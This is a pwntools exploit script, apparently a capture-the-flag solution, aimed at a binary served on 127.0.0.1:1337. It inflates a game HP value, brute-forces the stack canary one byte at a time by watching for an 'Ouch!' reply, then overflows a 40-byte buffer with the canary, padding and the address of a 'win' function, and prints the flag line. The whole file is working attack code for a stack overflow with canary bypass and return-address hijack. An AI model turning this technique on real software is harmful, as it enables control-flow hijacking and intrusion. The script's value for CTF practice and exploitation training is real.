from pwn import *

p = remote("127.0.0.1", 1337)
#p = process("./main")
# p = gdb.debug("./main", gdbscript="""
#     set follow-fork-mode child
#     b * attack+70
# """)

p.recvuntil(b"> ")

print("HP boost")
for _ in range(256//3 * 7):
    p.sendline(b"3")
for _ in range(256//3 * 7):
    p.recvuntil(b"> ")

print("Attack")
prefix = b"\x00"
for i in range(7):
    for i in range(255):
        p.sendline(b"1")
        p.send(b"A"*40 + prefix + bytes([i]))
        x = p.recvuntil(b"> ")
        if b"Ouch!" not in x:
            prefix += bytes([i])
            print(f"Found byte: {i} {prefix}")
            break
    else:
        print("Failed to find byte")
        exit(1)

win = 0x401216
p.sendline(b"1")
p.send(b"A"*40 + prefix + b"BBBBBBBB" + p64(win))

lines = p.recvuntil(b"> ").split(b"\n")
for line in lines:
    if b"ptr{" in line:
        print(line)

p.close()
